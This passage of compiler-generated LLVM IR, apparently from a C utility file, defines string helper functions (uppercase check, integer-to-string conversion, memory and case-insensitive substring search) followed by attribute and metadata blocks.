  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

10:                                               ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

18:                                               ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

20:                                               ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isupper(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @util_itoa(i32 noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [34 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %7, align 8
  %14 = icmp eq i8* %13, null
  br i1 %14, label %15, label %16

15:                                               ; preds = %3
  store i8* null, i8** %4, align 8
  br label %81

16:                                               ; preds = %3
  %17 = load i32, i32* %5, align 4
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %74

19:                                               ; preds = %16
  store i32 32, i32* %10, align 4
  %20 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 33
  store i8 0, i8* %20, align 1
  %21 = load i32, i32* %6, align 4
  %22 = icmp eq i32 %21, 10
  br i1 %22, label %23, label %29

23:                                               ; preds = %19
  %24 = load i32, i32* %5, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %23
  store i32 1, i32* %9, align 4
  %27 = load i32, i32* %5, align 4
  %28 = sub nsw i32 0, %27
  store i32 %28, i32* %12, align 4
  br label %31

29:                                               ; preds = %23, %19
  store i32 0, i32* %9, align 4
  %30 = load i32, i32* %5, align 4
  store i32 %30, i32* %12, align 4
  br label %31

31:                                               ; preds = %29, %26
  br label %32

32:                                               ; preds = %47, %31
  %33 = load i32, i32* %12, align 4
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %58

35:                                               ; preds = %32
  %36 = load i32, i32* %12, align 4
  %37 = load i32, i32* %6, align 4
  %38 = urem i32 %36, %37
  store i32 %38, i32* %11, align 4
  %39 = load i32, i32* %11, align 4
  %40 = icmp slt i32 %39, 10
  br i1 %40, label %41, label %44

41:                                               ; preds = %35
  %42 = load i32, i32* %11, align 4
  %43 = add nsw i32 %42, 48
  store i32 %43, i32* %11, align 4
  br label %47

44:                                               ; preds = %35
  %45 = load i32, i32* %11, align 4
  %46 = add nsw i32 %45, 55
  store i32 %46, i32* %11, align 4
  br label %47

47:                                               ; preds = %44, %41
  %48 = load i32, i32* %11, align 4
  %49 = trunc i32 %48 to i8
  %50 = load i32, i32* %10, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %51
  store i8 %49, i8* %52, align 1
  %53 = load i32, i32* %6, align 4
  %54 = load i32, i32* %12, align 4
  %55 = udiv i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %10, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %10, align 4
  br label %32, !llvm.loop !36

58:                                               ; preds = %32
  %59 = load i32, i32* %9, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %65

61:                                               ; preds = %58
  %62 = load i32, i32* %10, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %63
  store i8 45, i8* %64, align 1
  br label %68

65:                                               ; preds = %58
  %66 = load i32, i32* %10, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %10, align 4
  br label %68

68:                                               ; preds = %65, %61
  %69 = load i8*, i8** %7, align 8
  %70 = load i32, i32* %10, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %71
  %73 = call i32 @util_strcpy(i8* noundef %69, i8* noundef %72)
  br label %79

74:                                               ; preds = %16
  %75 = load i8*, i8** %7, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 0
  store i8 48, i8* %76, align 1
  %77 = load i8*, i8** %7, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  store i8 0, i8* %78, align 1
  br label %79

79:                                               ; preds = %74, %68
  %80 = load i8*, i8** %7, align 8
  store i8* %80, i8** %4, align 8
  br label %81

81:                                               ; preds = %79, %15
  %82 = load i8*, i8** %4, align 8
  ret i8* %82
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_memsearch(i8* noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

15:                                               ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %50

16:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

17:                                               ; preds = %46, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %49

21:                                               ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

35:                                               ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

40:                                               ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %50

43:                                               ; preds = %35
  br label %45

44:                                               ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

45:                                               ; preds = %44, %43
  br label %46

46:                                               ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %17, !llvm.loop !37

49:                                               ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %50

50:                                               ; preds = %49, %40, %15
  %51 = load i32, i32* %5, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_stristr(i8* noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* noundef %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

16:                                               ; preds = %82, %3
  %17 = load i32, i32* %6, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %6, align 4
  %19 = icmp sgt i32 %17, 0
  br i1 %19, label %20, label %83

20:                                               ; preds = %16
  %21 = load i8*, i8** %8, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %8, align 8
  %23 = load i8, i8* %21, align 1
  store i8 %23, i8* %11, align 1
  %24 = load i8*, i8** %7, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  store i8 %28, i8* %12, align 1
  %29 = load i8, i8* %11, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp sge i32 %30, 65
  br i1 %31, label %32, label %40

32:                                               ; preds = %20
  %33 = load i8, i8* %11, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp sle i32 %34, 90
  br i1 %35, label %36, label %40

36:                                               ; preds = %32
  %37 = load i8, i8* %11, align 1
  %38 = sext i8 %37 to i32
  %39 = or i32 %38, 96
  br label %43

40:                                               ; preds = %32, %20
  %41 = load i8, i8* %11, align 1
  %42 = sext i8 %41 to i32
  br label %43

43:                                               ; preds = %40, %36
  %44 = phi i32 [ %39, %36 ], [ %42, %40 ]
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %11, align 1
  %46 = load i8, i8* %12, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp sge i32 %47, 65
  br i1 %48, label %49, label %57

49:                                               ; preds = %43
  %50 = load i8, i8* %12, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp sle i32 %51, 90
  br i1 %52, label %53, label %57

53:                                               ; preds = %49
  %54 = load i8, i8* %12, align 1
  %55 = sext i8 %54 to i32
  %56 = or i32 %55, 96
  br label %60

57:                                               ; preds = %49, %43
  %58 = load i8, i8* %12, align 1
  %59 = sext i8 %58 to i32
  br label %60

60:                                               ; preds = %57, %53
  %61 = phi i32 [ %56, %53 ], [ %59, %57 ]
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %12, align 1
  %63 = load i8, i8* %11, align 1
  %64 = sext i8 %63 to i32
  %65 = load i8, i8* %12, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %64, %66
  br i1 %67, label %68, label %81

68:                                               ; preds = %60
  %69 = load i32, i32* %10, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %10, align 4
  %71 = load i32, i32* %9, align 4
  %72 = icmp eq i32 %70, %71
  br i1 %72, label %73, label %80

73:                                               ; preds = %68
  %74 = load i8*, i8** %8, align 8
  %75 = load i8*, i8** %5, align 8
  %76 = ptrtoint i8* %74 to i64
  %77 = ptrtoint i8* %75 to i64
  %78 = sub i64 %76, %77
  %79 = trunc i64 %78 to i32
  store i32 %79, i32* %4, align 4
  br label %84

80:                                               ; preds = %68
  br label %82

81:                                               ; preds = %60
  store i32 0, i32* %10, align 4
  br label %82

82:                                               ; preds = %81, %80
  br label %16, !llvm.loop !38

83:                                               ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %84

84:                                               ; preds = %83, %73
  %85 = load i32, i32* %4, align 4
  ret i32 %85
}

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { argmemonly nofree nounwind willreturn writeonly }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone willreturn }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
